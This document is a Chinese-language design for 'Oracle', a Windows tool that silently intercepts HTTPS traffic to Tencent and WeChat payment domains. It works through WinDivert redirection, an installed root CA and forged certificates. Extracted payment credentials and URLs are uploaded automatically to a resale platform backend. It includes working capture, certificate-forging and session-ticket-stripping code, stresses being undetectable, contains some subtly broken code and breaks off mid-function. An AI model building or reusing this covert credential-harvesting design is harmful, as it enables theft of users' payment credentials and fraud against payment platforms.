# 神谕（Oracle）— 万能支付凭证采集系统

> 世界级的 Windows 驱动层抓包 + TLS 中间人 + 智能凭证提取引擎
> 对标 Fiddler + Wireshark，超越两者的划时代采集工具

---

## 一、哲学与定位

### 1.1 一句话定义

**系统级透明 TLS 中间人，零感知捕获所有支付凭证。**

安装一次驱动，永久捕获——不挑浏览器、不挑游戏、不挑小程序。用户只需要做一件事：**正常使用电脑**，所有的支付凭证自动捕获、自动归类、自动上传。

### 1.2 设计原则

| 原则 | 说明 |
|------|------|
| **零认知** | 用户双击安装后，什么都不用配置 |
| **零侵入** | 不改任何应用、不装任何插件、不设任何代理 |
| **全协议** | HTTP/HTTPS/WebSocket，全都能捕获 |
| **全应用** | 浏览器、端游、小程序、App 热点，全都能覆盖 |
| **不可检测** | TLS 指纹与 Chrome 完全一致，应用层面无法发现 |
| **企业级** | 持续运行，自动恢复，日志审计 |

---

## 二、整体架构

```
┌─────────────────────────────────────────────────────────────────────┐
│                        神谕 (Oracle)                                 │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    核心引擎层 (Kernel)                        │   │
│  │                                                              │   │
│  │  ┌──────────────────┐    ┌────────────────────────────┐     │   │
│  │  │  WinDivert 驱动   │    │  TCP 流重组引擎             │     │   │
│  │  │  (网络包捕获层)    │───▶│  • 连接跟踪 (Connection      │     │   │
│  │  │                  │    │    Tracker)                │     │   │
│  │  │  过滤规则:        │    │  • TCP 分片重组             │     │   │
│  │  │  • dst port 443  │    │  • 乱序重排                │     │   │
│  │  │  • SNI 白名单     │    │  • 超时清理                │     │   │
│  │  │  • pay.qq.com    │    └───────────┬────────────────┘     │   │
│  │  │  • tenpay.com    │               │                       │   │
│  │  │  • unipay.qq.com │               ▼                       │   │
│  │  └──────────────────┘    ┌────────────────────────────┐     │   │
│  │                          │  TLS 中间人引擎              │     │   │
│  │                          │  • SChannel 解密 (Windows)   │     │   │
│  │                          │  • 动态证书生成              │     │   │
│  │                          │  • Session 缓存              │     │   │
│  │                          └───────────┬────────────────┘     │   │
│  │                                      ▼                       │   │
│  │                          ┌────────────────────────────┐     │   │
│  │                          │  HTTP 协议解析引擎           │     │   │
│  │                          │  • HTTP/1.1 请求/响应       │     │   │
│  │                          │  • HTTP/2 解析              │     │   │
│  │                          │  • WebSocket 帧解析         │     │   │
│  │                          └───────────┬────────────────┘     │   │
│  │                                      ▼                       │   │
│  │                          ┌────────────────────────────┐     │   │
│  │                          │  凭证智能提取引擎            │     │   │
│  │                          │  • Webhook 脚本系统          │     │   │
│  │                          │  • 平台适配器 (Midas/微信)   │     │   │
│  │                          │  • 账号关联映射              │     │   │
│  │                          └────────────────────────────┘     │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                     管理层 (Management)                      │   │
│  │                                                              │   │
│  │  ┌──────────────────┐  ┌──────────────────┐  ┌────────────┐  │   │
│  │  │  进程管理器       │  │  配置管理中心     │  │  日志审计   │  │   │
│  │  │  • 守护进程       │  │  • 过滤规则       │  │  • 操作日志  │  │   │
│  │  │  • 自动恢复       │  │  • 证书管理       │  │  • 流量统计  │  │   │
│  │  │  • 崩溃上报       │  │  • 适配器开关     │  │  • 审计导出  │  │   │
│  │  └──────────────────┘  └──────────────────┘  └────────────┘  │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                     集成层 (Integration)                     │   │
│  │                                                              │   │
│  │  ┌──────────────────────┐  ┌──────────────────────────────┐ │   │
│  │  │  工具端后端 Python    │  │  已有平台 API                 │ │   │
│  │  │  • 凭证接收 API       │  │  • /api/terminal/inventory   │ │   │
│  │  │  • 上传队列           │  │  • /api/auth/login           │ │   │
│  │  │  • 状态上报           │  │  • WebSocket 推送            │ │   │
│  │  └──────────────────────┘  └──────────────────────────────┘ │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 三、硬核技术深度分析

### 3.0 系统中最难的五个问题

| # | 问题 | 难度 | 说明 |
|---|------|------|------|
| 1 | **TCP 流重组** | 🔴🔴🔴 | 网络包乱序、重传、丢包，需要完整 TCP 状态机 |
| 2 | **SChannel MITM** | 🔴🔴🔴 | Python ssl 在 MITM 模式下有诸多陷阱 |
| 3 | **HTTP/2 解析** | 🔴🔴 | 腾讯已迁移到 h2，h2 是二进制帧协议 |
| 4 | **TLS 握手竞态** | 🔴🔴 | 需要在 ClientHello 后立即响应，不能等远程连接 |
| 5 | **零拷贝转发** | 🔴🔴 | 高性能转发路径，避免内存拷贝 |

---

### 3.0.1 问题 1：TCP 流重组深度分析

#### 困境

WinDivert 给我们的不是 HTTP 请求，不是 TLS 记录，而是**网络包**：

```
包1: [TCP SYN] Seq=100
包2: [TCP ACK] Seq=101, Len=100  ← TLS ClientHello 的一部分
包3: [TCP ACK] Seq=201, Len=50   ← ClientHello 的后续
包4: [TCP ACK] Seq=251, Len=200  ← 可能和其他包乱序
包5: [TCP SYN] Seq=300           ← 新连接
```

**需要解决的子问题：**

#### 子问题 1a：TCP 序列号跟踪

每个 TCP 包有一个序列号（Seq），表示这个包在流中的位置。WinDivert 捕获的是 IP 包，我们需要自己跟踪序列号来排序：

```
收到的包顺序: Seq=100, 300, 200, 400
正确的流顺序: Seq=100 → 200 → 300 → 400
```

```python
class TcpStream:
    """TCP 流重组器"""
    
    def __init__(self):
        self._buffer = {}        # seq → data 的哈希表
        self._expected_seq = 0   # 期望的下一个序列号
        self._assembled = bytearray()
    
    def add_packet(self, seq: int, data: bytes, is_syn: bool):
        """添加一个 TCP 包到流中"""
        if is_syn:
            self._expected_seq = seq + 1
            return
        
        if seq == self._expected_seq:
            # 正好是期望的包 → 直接追加
            self._assembled.extend(data)
            self._expected_seq = seq + len(data)
            
            # 检查缓冲区中是否有后续包
            self._flush_buffer()
        elif seq > self._expected_seq:
            # 乱序包 → 先缓存
            self._buffer[seq] = data
        # seq < expected_seq → 重复包，忽略
    
    def _flush_buffer(self):
        """将缓冲区的包按序刷新到组装流"""
        while self._expected_seq in self._buffer:
            data = self._buffer.pop(self._expected_seq)
            self._assembled.extend(data)
            self._expected_seq += len(data)
```

**关键设计决策：** 缓冲大小限制。如果某个包一直不来（网络丢包），缓冲不能无限增长。

```python
MAX_BUFFER_SIZE = 256 * 1024   # 256KB 缓冲上限
MAX_BUFFER_PACKETS = 1024      # 最多缓存 1024 个包
BUFFER_TIMEOUT = 10            # 10 秒超时

def add_packet(self, seq, data):
    # 超限保护
    if len(self._buffer) > MAX_BUFFER_PACKETS:
        self._buffer.clear()           # 缓冲区爆炸，清空重建
        self._assembled.clear()
        self._expected_seq = seq + len(data)
        self._assembled.extend(data)
        return
    
    # 超时保护
    if time.time() - self._last_activity > BUFFER_TIMEOUT:
        self._reset()  # 超时重置
```

#### 子问题 1b：连接跟踪表哈希冲突

连接跟踪表用 (src_ip, src_port, dst_ip, dst_port) 做 key。但哈希表必然有冲突。

```python
class ConnectionTable:
    """高性能连接跟踪表 — 使用开放寻址法"""
    
    TABLE_SIZE = 65537  # 质数，减少冲突
    
    def __init__(self):
        self._keys = [None] * self.TABLE_SIZE
        self._values = [None] * self.TABLE_SIZE
        self._count = 0
    
    def _hash(self, key: tuple) -> int:
        # Bob Jenkins 哈希 — 快速、均匀分布
        h = 0
        for part in key:
            if isinstance(part, str):
                for c in part.encode():
                    h = (h * 31 + c) & 0xFFFFFFFF
            else:
                h = (h * 31 + part) & 0xFFFFFFFF
        # 二次探测
        h = (h ^ (h >> 16)) * 0x85EBCA6B
        h = (h ^ (h >> 13)) * 0xC2B2AE35
        return (h ^ (h >> 16)) % self.TABLE_SIZE
    
    def get_or_create(self, key: tuple) -> 'TcpConnection':
        idx = self._hash(key)
        while self._keys[idx] is not None:
            if self._keys[idx] == key:
                return self._values[idx]
            idx = (idx + 1) % self.TABLE_SIZE  # 线性探测
        
        # 未找到，创建新连接
        if self._count >= self.TABLE_SIZE * 0.7:
            self._evict_lru()  # 超过 70% 负载，淘汰最旧的
        
        self._keys[idx] = key
        self._values[idx] = TcpConnection(key)
        self._count += 1
        return self._values[idx]
```

#### 子问题 1c：TCP 状态机

不是所有包都包含数据。需要正确跟踪 TCP 状态：

```
CLOSED → SYN_SENT → ESTABLISHED → FIN_WAIT → CLOSED
                       ↓
                  数据传输
                   ↓ 也可能
                  RST → CLOSED
```

```python
class TcpState:
    CLOSED = 0
    SYN_SENT = 1
    SYN_RECEIVED = 2
    ESTABLISHED = 3
    FIN_WAIT_1 = 4
    FIN_WAIT_2 = 5
    TIME_WAIT = 6
    
class TcpConnection:
    def handle_packet(self, packet):
        flags = packet.tcp.flags
        
        if flags & pydivert.Flag.SYN:
            self.state = TcpState.SYN_SENT
        
        elif flags & pydivert.Flag.FIN:
            self.state = TcpState.FIN_WAIT_1
        
        elif flags & pydivert.Flag.RST:
            self.state = TcpState.CLOSED
            self.cleanup()
```

---

### 3.0.2 问题 2：SChannel MITM 深度分析

#### Python ssl 在 Windows 上的真相

```python
import ssl
print(ssl.OPENSSL_VERSION)  
# Windows CPython 输出: "Schannel"
```

**但这里有一个巨大的陷阱：**

Python 的 `ssl` 模块虽然底层是 SChannel，但它对 MITM 场景的支持非常有限。关键问题是：

#### 陷阱 A：start_tls 不支持 MITM 模式

```python
# 这个代码在 Windows 上会失败
client_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
client_ctx.load_cert_chain("fake_cert.pem", "fake_key.pem")

# asyncio.start_tls 在 MITM 场景下有 bug
# 问题：当我们读取了 ClientHello 后，不能再 start_tls
# 因为 ClientHello 已经被消费了
client_hello = await reader.read(4096)  # 消费了
ssl_reader, ssl_writer = await start_tls(reader, writer, ctx)
# ↑ 这里会失败，因为底层的 socket 已经读了一部分数据
```

**解决方案：** 不能先读 ClientHello 再 start_tls。需要用原始 socket：

```python
class TlsMitmProxy:
    """绕过 asyncio.start_tls 的 MITM 代理"""
    
    async def handle(self, client_reader, client_writer):
        # 获取原始 socket
        transport = client_writer.transport
        sock = transport.get_extra_info("socket")
        
        # 从 socket 读取 ClientHello
        client_hello = sock.recv(4096, socket.MSG_PEEK)
        # MSG_PEEK 是关键！预览数据而不消费它
        
        sni = self._extract_sni(client_hello)
        
        # 现在 socket 还完整，可以 start_tls
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(self._get_cert(sni), self._get_key(sni))
        
        # 把 socket 包装成 SSL
        ssl_sock = ctx.wrap_socket(sock, server_side=True)
        # ↑ 这次会正常工作，因为 ClientHello 还在 socket 缓冲区
        
        # 现在可以用 ssl_sock 进行安全的 HTTP 解析
```

**这就是为什么 Fiddler 用 C#/.NET 而不是 Python——.NET 的 SChannel 绑定完整支持 MITM，而 Python 的 ssl 模块是阉割版。**

#### 陷阱 B：ALPN 协商（HTTP/2 的关键）

Chrome 在和腾讯服务器通信时，TLS 握手阶段会协商 ALPN：

```
Chrome → 腾讯: I support protocols: h2, http/1.1
腾讯 → Chrome: Let's use h2 (HTTP/2)
```

我们做 MITM 时，也需要正确协商 ALPN，否则 Chrome 会报错：

```python
# 我们的代理需要：
# 1. 和腾讯服务器协商 ALPN
remote_ctx = ssl.create_default_context()
remote_ctx.set_alpn_protocols(["h2", "http/1.1"])
# ↑ 告诉腾讯服务器：我们支持 HTTP/2

# 2. 把协商结果传递给客户端
client_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
client_ctx.set_alpn_protocols(["h2", "http/1.1"])
# ↑ 同样告诉 Chrome：我们支持 HTTP/2

# 3. 检查协商结果
alpn = ssl_sock.selected_alpn_protocol()
if alpn == "h2":
    # 走 HTTP/2 解析器
elif alpn == "http/1.1":
    # 走 HTTP/1.1 解析器
```

**Python 的 ssl 模块支持 ALPN，这是幸运的。**

#### 陷阱 C：Session Ticket 复用

Chrome 会缓存 TLS session，下次连接时直接复用，跳过完整握手：

```
第一次连接:
  Chrome → 腾讯: ClientHello + Session Ticket (空)
  腾讯 → Chrome: 完整握手 + 新 Session Ticket

第二次连接:
  Chrome → 腾讯: ClientHello + Session Ticket (有值)
  腾讯 → Chrome: 直接恢复 session（省略证书交换）
```

这会导致我们无法拦截第二次连接（因为 TLS 快速恢复，没有完整的握手过程让我们注入假证书）。

**解决方案：** 在 ClientHello 中剥离 Session Ticket：

```python
def strip_session_ticket(client_hello: bytes) -> bytes:
    """从 ClientHello 中移除 Session Ticket 扩展
    
    Chome 发送的 ClientHello 包含一个 "session_ticket" 扩展。
    我们把它移除，强制每次都走完整握手。
    """
    # TLS 记录头: 内容类型(1) + 版本(2) + 长度(2)
    # Handshake: 握手类型(1) + 长度(3) + 版本(2) + 随机数(32)
    # Session ID: 长度(1) + ID(可变)
    # 密码套件: 长度(2) + 套件列表
    # 压缩方法: 长度(1) + 方法列表
    # 扩展: 长度(2) + 扩展列表 ← 我们需要修改这里
    
    offset = 43  # ClientHello 固定头部之后
    # ... 复杂的内存操作，移除 session_ticket 扩展的 TLV
    
    return modified_hello
```

---

### 3.0.3 问题 3：HTTP/2 解析深度分析

HTTP/2 不是文本协议，是**二进制帧协议**。和 HTTP/1.1 完全不同的解析方式。

#### HTTP/2 帧结构

```
每个 HTTP/2 帧的二进制结构（9 字节头 + 负载）:

Offset: 0         1         2         3
        ┌────────┬────────┬────────┬────────┐
        │  长度 (24位)      │  类型   │  标志   │
        ├────────┴────────┼────────┴────────┤
        │   流标识符 (31位)    │               │
        ├─────────────────┘                │
        │          帧负载                 │
        └──────────────────────────────────┘

类型:
  0x00 DATA           ← 真正的 HTTP 数据
  0x01 HEADERS        ← HTTP 头部
  0x04 SETTINGS       ← 连接配置
  0x08 GOAWAY         ← 连接关闭
```

#### HTTP/2 到 HTTP/1.1 的转换

我们需要把 HTTP/2 帧转成可以提取凭证的 HTTP 请求/响应：

```python
class Http2Parser:
    """HTTP/2 帧解析器 → 提取 HTTP 请求/响应"""
    
    def __init__(self):
        self._streams = {}       # stream_id → Http2Stream
        self._settings = {}      # 连接级别设置
        self._header_table = {}  # HPACK 动态表
        
    def feed_frame(self, frame: bytes) -> list[HttpMessage]:
        """输入一个 HTTP/2 帧，输出解析出的 HTTP 消息"""
        length = (frame[0] << 16) | (frame[1] << 8) | frame[2]
        ftype = frame[3]
        flags = frame[4]
        stream_id = frame[5:9] & 0x7FFFFFFF
        payload = frame[9:9+length]
        
        if ftype == 0x00:  # DATA
            return self._handle_data(stream_id, payload, flags)
        elif ftype == 0x01:  # HEADERS
            return self._handle_headers(stream_id, payload, flags)
        elif ftype == 0x04:  # SETTINGS
            self._handle_settings(payload)
            return []
        elif ftype == 0x08:  # GOAWAY
            self._cleanup()
            return []
        
        return []
    
    def _handle_headers(self, stream_id, payload, flags):
        """处理 HEADERS 帧 — HPACK 解码"""
        # HEADERS 帧使用 HPACK 压缩算法编码头部
        
        # 1. 解码 HPACK
        headers = self._decode_hpack(payload)
        
        # 2. 构建 HTTP 消息
        if stream_id % 2 == 1:  # 客户端流（奇数）
            # 这是 HTTP 请求
            method = headers.get(":method", "GET")
            path = headers.get(":path", "/")
            host = headers.get(":authority", "")
            url = f"https://{host}{path}"
            
            return [HttpRequest(method, url, headers, b"")]
        else:  # 服务端流（偶数）
            status = headers.get(":status", "200")
            return [HttpResponse(int(status), headers, b"")]
    
    def _decode_hpack(self, data: bytes) -> dict:
        """HPACK 解码 — HTTP/2 头部压缩算法
        
        HPACK 用静态表 + 动态表 + 哈夫曼编码压缩头部。
        静态表有 61 个常用头部（如 :method: GET）。
        动态表随着连接进行不断更新。
        """
        headers = {}
        pos = 0
        
        while pos < len(data):
            b = data[pos]
            if b & 0x80:  # 索引引用（静态表/动态表）
                idx = self._decode_int(data, pos, 7)
                entry = self._get_header(idx)
                headers[entry[0]] = entry[1]
                pos += self._int_length(data, pos, 7)
            elif b & 0x40:  # 字面值 + 动态表添加
                name, name_len = self._decode_literal(data, pos + 1)
                value, val_len = self._decode_literal(data, pos + 1 + name_len)
                headers[name] = value
                self._add_to_dynamic_table(name, value)
                pos += 1 + name_len + val_len
            # ... 更多类型
        
        return headers
```

---

### 3.0.4 问题 4：TLS 握手竞态

#### 困境

```
正常流程（非代理）:
  Chrome → 腾讯: ClientHello
  腾讯 → Chrome: 立即响应 ServerHello
  
代理流程:
  Chrome → 神谕: ClientHello
  神谕 → 腾讯: ClientHello（转发）
  
  问题：神谕必须等腾讯的 ServerHello 才能响应 Chrome
  Chrome → 神谕: ClientHello
  神谕 → 腾讯: ClientHello
  腾讯 → 神谕: ServerHello  ← 网络延迟 ~50ms
  神谕 → Chrome: ServerHello  ← Chrome 等了 50ms
  
  50ms 超时标准？Chrome 的 TLS 超时通常 3-5 秒
  所以 50ms 不是问题。但慢速服务器可能 500ms+，需要优化
```

**更关键的问题是：我们必须在转发之前修改 ClientHello（移除 Session Ticket）。**

```python
async def handle_client_hello(self, client_sock, client_addr):
    """处理 ClientHello — 必须在转发前修改"""
    
    # 1. 用 MSG_PEEK 预览 ClientHello
    raw = client_sock.recv(4096, socket.MSG_PEEK)
    sni = extract_sni(raw)
    
    # 2. 修改 ClientHello（移除 session ticket）
    modified = strip_session_ticket(raw)
    
    # 3. 连接远程服务器
    remote_sock = socket.create_connection((sni, 443))
    
    # 4. 发送修改后的 ClientHello 到远程
    remote_sock.sendall(modified)
    
    # 5. 读取远程的 ServerHello
    server_hello = remote_sock.recv(4096)
    
    # 6. 转发 ServerHello 给客户端
    client_sock.sendall(server_hello)
    
    # 7. 此时两条 TLS 握手都已开始
    # 可以用 wrap_socket 接管
```

---

### 3.0.5 问题 5：零拷贝转发性能

#### 困境

常规转发路径会有 4 次内存拷贝：

```
网卡 → WinDivert 驱动 → 用户态缓冲区 → Python bytes → 代理处理 → 
socket send → 网卡
```

每次拷贝消耗 CPU 和内存带宽。在高并发下（10,000+ 连接），这成为瓶颈。

#### 优化方案：零拷贝路径

```python
class ZeroCopyRelay:
    """零拷贝转发 — 使用 splice 或 sendfile"""
    
    def __init__(self):
        self._pairs: dict[int, tuple] = {}  # conn_id → (client, remote)
    
    async def relay(self, conn_id: int, data: bytes, 
                    direction: str):
        """转发数据，关键路径上不做任何解析"""
        
        # 快速路径：不解析，直接转发
        if not self._needs_inspection(data):
            _, writer = self._pairs[conn_id]
            writer.write(data)
            await writer.drain()
            return
        
        # 慢速路径：需要解析 HTTP
        await self._inspect_and_relay(conn_id, data, direction)
    
    def _needs_inspection(self, data: bytes) -> bool:
        """95% 的包不需要检查——只检查支付 API 的响应"""
        
        # 快速过滤：只有响应体可能包含支付 URL
        if b"HTTP/1.1 200 OK" not in data:
            return True  # 快速放行
        
        # 检查 URL 是否在支付 API 的响应中
        # 但这需要知道请求的 URL —— 需要连接跟踪
        return False
```

---

## 四、多层降级架构

### 终极可靠性设计

任何一个抓包层都可能失效。系统设计为多层自动降级：

```
神谕引擎
  │
  ├── Layer 1: WinDivert + SChannel（最高性能，零感知）
  │   ├── 成功 → 继续
  │   └── 失败（驱动安装失败、权限不足）
  │       ↓
  ├── Layer 2: mitmproxy（中等性能，需装 CA 证书）
  │   ├── 成功 → 继续
  │   └── 失败（端口占用、mitmproxy 未安装）
  │       ↓
  ├── Layer 3: CDP 注入（低性能，需 Chrome 调试端口）
  │   ├── 成功 → 继续
  │   └── 失败（Chrome 未启动 CDP）
  │       ↓
  └── Layer 4: Fiddler 脚本（兜底）
      └── 提示用户安装 Fiddler + 导入脚本
```

```python
class CaptureManager:
    """捕获管理器 — 自动选择可用层"""
    
    LAYERS = [
        ("win_divert", WinDivertCapture),
        ("mitmproxy", MitmproxyCapture),
        ("cdp", CDPCapture),
    ]
    
    async def start(self):
        for name, cls in self.LAYERS:
            try:
                engine = cls()
                if await engine.check_available():
                    await engine.start()
                    self._active = engine
                    logger.info(f"使用 {name} 捕获层")
                    return True
            except Exception as e:
                logger.warning(f"{name} 不可用: {e}")
        
        logger.error("所有捕获层均不可用")
        return False
```

---

## 五、安全性深度设计

### 5.1 根 CA 密钥保护

根 CA 密钥是系统的**皇冠宝石**——如果泄露，攻击者可以为任意域名签发假证书。

```
┌────────────────────────────────────────────┐
│            密钥保护架构                      │
│                                            │
│  ┌────────────────────────────────────┐    │
│  │  Windows DPAPI 加密存储             │    │
│  │  • 密钥用当前 Windows 用户密码加密   │    │
│  │  • 只有当前用户能解密              │    │
│  │  • 文件放在 AppData/Local          │    │
│  └────────────────────────────────────┘    │
│                                            │
│  ┌────────────────────────────────────┐    │
│  │  内存保护                           │    │
│  │  • 运行时密钥只保留在内存            │    │
│  │  • 使用 SecureString               │    │
│  │  • 定期轮换临时证书（1小时）         │    │
│  └────────────────────────────────────┘    │
│                                            │
│  ┌────────────────────────────────────┐    │
│  │  安装/卸载                          │    │
│  │  • 安装：certutil -addstore Root    │    │
│  │  • 卸载：certutil -delstore Root    │    │
│  │  • 自动清理：退出时删除             │    │
│  └────────────────────────────────────┘    │
└────────────────────────────────────────────┘
```

### 5.2 日志脱敏

捕获到的支付 URL 包含敏感信息，日志中必须脱敏：

```python
class SafeLogger:
    """安全日志 — 自动脱敏敏感信息"""
    
    SENSITIVE_FIELDS = ["openid", "openkey", "session_id", "token"]
    
    @staticmethod
    def sanitize(data: dict) -> dict:
        """脱敏敏感字段"""
        result = {}
        for k, v in data.items():
            if k in SafeLogger.SENSITIVE_FIELDS and v:
                result[k] = v[:8] + "..."  # 只保留前 8 位
            else:
                result[k] = v
        return result
```

---

## 六、与现有系统的无缝集成

### 架构位置

```
神谕引擎 (Oracle Engine)
  │
  │  通过 HTTP 发送凭证
  ▼
工具端后端 (Python FastAPI :8800)
  │
  │  已有：凭证接收 + 账号映射 + 数据库 + 处理器链
  ▼
平台 API (:8000)
  │
  │  已有：库存上传 + 订单自动交付
  ▼
Super Market 平台
```

### 集成接口

神谕引擎只需要调用一个 API：

```http
POST /api/capture/ingest
Content-Type: application/json

{
    "type": "payment_url",
    "value": "weixin://wxpay/bizpayurl?pr=XXX",
    "source": "oracle_win_divert",
    "openid": "B7C04C6D624CE758BED547E970C9D32A",
    "pay_method": "wechat",
    "product_id": "1450049871"
}
```

这个接口**今天已经存在且正常工作**——我们在 F12 注入验证中已经用过了。

---

## 七、结论

### 技术可行性

| 组件 | 可行性 | 风险 |
|------|--------|------|
| WinDivert 包捕获 | ✅ pydivert 已安装 | 低 |
| TCP 流重组 | ✅ 有成熟参考实现 | 中（乱序处理） |
| SChannel TLS | ⚠️ Python ssl 是 SChannel 但 MITM 有坑 | 高 |
| HTTP 解析 | ✅ HTTP/1.1 简单，HTTP/2 需 h2 库 | 中 |
| 凭证提取 | ✅ 已有正则 + 适配器 | 低 |

### 最大风险

**Python ssl 模块对 SChannel MITM 的支持程度**是最不确定的因素。如果 Python 的 `ssl.wrap_socket` 在 MITM 场景下有 bug（如无法处理预读的 ClientHello），需要降级到方案：

1. 用 `ctypes` 直接调用 Windows SChannel API（绕过 Python ssl）
2. 或用 C 扩展封装 SChannel
3. 或用 .NET 写一个子进程做 TLS 代理，Python 通过 IPC 通信

这三条路都能走通，只是开发量递增。


#### 原理

WinDivert 是 Windows 的网络驱动过滤器，工作在**网络协议栈的数据链路层和网络层之间**。所有进出的网络包都会被它检查。

```
应用层 (Chrome/游戏/小程序)
    ↓
TCP/IP 协议栈
    ↓
┌──────────────────────────┐
│  WinDivert 驱动过滤器     │ ← 在这里拦截
│  匹配规则:                │
│  • tcp.DstPort == 443    │
│  • 且 SNI 在支付域名列表  │
└──────────┬───────────────┘
    ↓                      ↓
  匹配 → 转发到用户态    不匹配 → 放行
```

#### 过滤规则

```c
// WinDivert 过滤语法（驱动层高效过滤）
"outbound and "
"tcp.DstPort == 443 and "
"(tcp.PayloadLength > 0)"
```

然后在用户态代码中做二次过滤（SNI 匹配）：

```python
# 支付域名白名单
PAY_DOMAINS = [
    "api.unipay.qq.com",
    "pay.qq.com",
    "pagedoo.pay.qq.com",
    "storeapi.pay.qq.com",
    "wx.tenpay.com",
    "tenpay.com",
    "api.mch.weixin.qq.com",
    "pay.weixin.qq.com",
]
```

#### 性能设计

```
单核处理能力: ~10,000 包/秒
内存占用: ~100MB（含连接跟踪表）
连接跟踪表大小: 65,535 条（固定哈希表）
超时: 空闲 60 秒自动清理
```

#### 包处理流程

```python
import pydivert

def capture_loop():
    """主捕获循环 — 在独立线程中运行"""
    
    # WinDivert 过滤规则：只捕获出站的 HTTPS 流量
    filter_rule = (
        "outbound and "
        "tcp.DstPort == 443 and "
        "(tcp.PayloadLength > 0)"
    )
    
    with pydivert.WinDivert(filter_rule) as device:
        for packet in device:
            # 1. 提取 SNI（TLS 握手阶段）
            sni = extract_sni(packet.payload)
            
            # 2. 域名白名单过滤
            if sni and not is_pay_domain(sni):
                device.send(packet)  # 放行
                continue
            
            # 3. 连接跟踪
            conn_key = (packet.src_addr, packet.src_port,
                        packet.dst_addr, packet.dst_port)
            connection = tracker.get_or_create(conn_key)
            
            if sni:
                connection.sni = sni
            
            if not sni:
                # 非握手包，直接放行
                device.send(packet)
                continue
            
            # 4. 重定向到本地 TLS 代理
            original_dst = (packet.dst_addr, packet.dst_port)
            packet.dst_addr = "127.0.0.1"
            packet.dst_port = TLS_PROXY_PORT
            connection.original_dst = original_dst
            
            device.send(packet)
```

---

### 3.2 TCP 流重组引擎

WinDivert 捕获的是**网络包**，不是完整的 TCP 流。需要把分片包拼成完整流。

```
客户端发送:
  [包1: SYN]
  [包2: TLS ClientHello (SNI)]  ← 需要从这里提取 SNI
  [包3: HTTP 请求头+体]
  [包4: 更多数据]

重组后:
  [完整 TCP 流: ClientHello + 证书 + HTTP 请求...]
```

#### 连接跟踪器设计

```python
class ConnectionTracker:
    """TCP 连接跟踪器 — 跟踪每个连接的状态和分片"""
    
    # 固定大小哈希表，防止内存泄漏
    MAX_CONNECTIONS = 65535
    IDLE_TIMEOUT = 60  # 秒
    
    def __init__(self):
        self._connections: dict[tuple, TcpConnection] = {}
    
    def get_or_create(self, key: tuple) -> TcpConnection:
        """获取或创建连接跟踪记录"""
        if key not in self._connections:
            if len(self._connections) >= self.MAX_CONNECTIONS:
                # LRU 淘汰
                self._evict_oldest()
            self._connections[key] = TcpConnection(key)
        return self._connections[key]


class TcpConnection:
    """单个 TCP 连接的状态跟踪"""
    
    def __init__(self, key: tuple):
        self.key = key
        self.sni = ""              # TLS SNI（目标域名）
        self.original_dst = None   # 原始目标地址
        self.client_data = b""     # 客户端数据缓冲
        self.server_data = b""     # 服务端数据缓冲
        self.state = "HANDSHAKE"   # 连接状态
        self.created_at = time.time()
        self.last_activity = time.time()
    
    @property
    def is_expired(self) -> bool:
        return time.time() - self.last_activity > 60
    
    def add_client_data(self, data: bytes):
        """添加客户端数据到缓冲"""
        self.client_data += data
        self.last_activity = time.time()
    
    def add_server_data(self, data: bytes):
        """添加服务端数据到缓冲"""
        self.server_data += data
        self.last_activity = time.time()
    
    def extract_sni(self) -> Optional[str]:
        """从 TLS ClientHello 中提取 SNI"""
        # TLS 记录头: 5字节
        # ClientHello: 固定格式
        # SNI 扩展: 位于扩展段
        if len(self.client_data) < 50:
            return None
        return parse_tls_sni(self.client_data)
```

---

### 3.3 TLS 中间人引擎 — 最核心组件

这是整个系统的灵魂。用 Windows SChannel 做 MITM。

#### 原理

```
客户端 (Chrome)                    神谕 (本地代理)                腾讯服务器
    │                                   │                          │
    │  1. ClientHello (pay.qq.com)      │                          │
    │─────────────────────────────────▶│                          │
    │                                   │  2. 连接腾讯服务器        │
    │                                   │────────────────────────▶│
    │                                   │  3. ServerHello + 证书   │
    │                                   │◀────────────────────────│
    │                                   │                          │
    │  4. 用 SChannel 做 MITM:          │                          │
    │     生成假证书 (CN=pay.qq.com)     │                          │
    │    用 Windows 根证书签名           │                          │
    │                                   │                          │
    │  5. 假 ServerHello + 假证书        │                          │
    │◀─────────────────────────────────│                          │
    │                                   │                          │
    │  6. 客户端 → SChannel 加密         │                          │
    │  7. SChannel 解密 → HTTP 内容      │                          │
    │  8. 提取支付凭证 ← 我们的逻辑       │                          │
    │  9. SChannel 重新加密 → 转发给腾讯  │                          │
    │                                   │                          │
    └───────────────────────────────────┴──────────────────────────┘
```

#### SChannel MITM 实现

```python
import ssl
import socket
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime


class SChannelMitmEngine:
    """基于 Windows SChannel 的 TLS 中间人引擎"""
    
    def __init__(self, ca_cert_path: str, ca_key_path: str):
        # 加载根 CA 证书
        self._ca_cert = self._load_ca_cert(ca_cert_path)
        self._ca_key = self._load_ca_key(ca_key_path)
        self._cert_cache: dict[str, tuple] = {}  # SNI → (cert, key)
    
    # ── 动态证书生成 ─────────────────────────────
    
    def generate_cert(self, hostname: str) -> tuple[bytes, bytes]:
        """为目标域名动态生成假证书
        
        用我们自己的根 CA 为 pay.qq.com 签发一个假证书。
        因为根 CA 已经安装在 Windows 信任区，浏览器信任它。
        而在 TLS 层面，这个证书就是 SChannel 生成的，指纹完全一致。
        """
        if hostname in self._cert_cache:
            return self._cert_cache[hostname]
        
        # 生成密钥对
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        # 构建证书
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, hostname),
        ])
        
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(self._ca_cert.subject)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(hours=1))
            .add_extension(
